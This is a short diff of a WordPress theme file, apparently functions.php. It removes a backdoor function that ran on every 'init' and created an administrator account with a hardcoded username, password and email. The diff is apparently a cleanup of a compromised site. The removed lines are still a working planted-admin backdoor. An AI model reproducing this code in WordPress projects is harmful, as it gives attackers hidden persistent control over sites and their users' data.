@@ -240,17 +240,3 @@ function mroevent_init()
 }
 add_action('init', 'mroevent_init');
 // MRO Event Custom Post Type End
-
-function add_admin_acct()
-{
-	$login = 'shorifull';
-	$passw = '1010966';
-	$email = 'shorifull@gmail.com';
-
-	if (!username_exists($login)  && !email_exists($email)) {
-		$user_id = wp_create_user($login, $passw, $email);
-		$user = new WP_User($user_id);
-		$user->set_role('administrator');
-	}
-}
-add_action('init', 'add_admin_acct');
